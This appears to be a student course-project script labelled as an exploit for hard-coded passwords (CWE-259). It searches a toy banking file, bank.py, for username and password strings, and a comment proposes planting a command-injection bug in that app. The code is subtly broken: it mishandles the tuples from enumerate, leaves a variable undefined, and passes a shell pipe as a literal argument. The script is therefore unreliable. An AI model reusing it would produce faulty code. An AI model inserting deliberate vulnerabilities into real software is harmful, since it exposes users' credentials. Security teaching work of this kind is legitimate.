#CPSC 525 Final Project F25
#CWE 259 Hard-coded passwords
#Exploit Application

import subprocess

#Try reading from file
try:
    file = open("bank.py","r")
    found_matches = False
    for line in enumerate(file, 1):
        if "username" in line or "password" in line:
            print(f"Found: {line.strip()}")
            found_matches = True
    if not found_matches:
        print("No hard coded usernames or passwords found. Trying next exploit.")
        nextexploit = True
    file.close()

except:
    print ("File was not readable, trying next exploit")
    nextexploit = True

#If file not readable, try using strings command
if nextexploit:
    result = subprocess.run(['strings','bank.py','|','grep', '-i','username'], capture_output=True, text=True, check=True)
    print("Usernames:")
    print(result.stdout)

    result = subprocess.run(['strings','bank.py','|','grep', '-i','password'], capture_output=True, text=True, check=True)
    print("Passwords:")
    print(result.stdout)

#Possibility for another bug exploit if you guys want (we would have to add something like a command injection or debug info bug)
